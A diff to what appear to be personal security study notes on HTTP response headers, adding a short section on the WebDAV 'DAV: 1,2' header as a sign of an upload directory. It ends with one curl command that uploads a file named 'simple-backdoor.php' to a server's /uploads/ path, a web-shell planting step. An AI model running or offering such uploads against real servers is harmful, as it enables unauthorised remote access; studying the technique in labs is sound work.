@@ -10,5 +10,16 @@ the headers for things like resource existence or modification dates.
 In HTTP response parsing, what does the "Content-Type" header specify? > Type of data in the response body
 
 Which HTTP response header informs the browser how long it should cache the response? > Cache-Control
+
+Response header
+---------------
+DAV: 1,2 
+
+Web DAV is a protocol, that allows users on the web to share copy,move and edit files. DAV 1,2 means that suppors DAV version 1 & 2. That response header is typically seen 
+in upload directory.
+
+Upload file with the curl
+-------------------------
+#curl http://192.157.170.3/uploads/ --upload-file simple-backdoor.php
 _____________________________________________________________________________________________________________________________________________________________________________
 
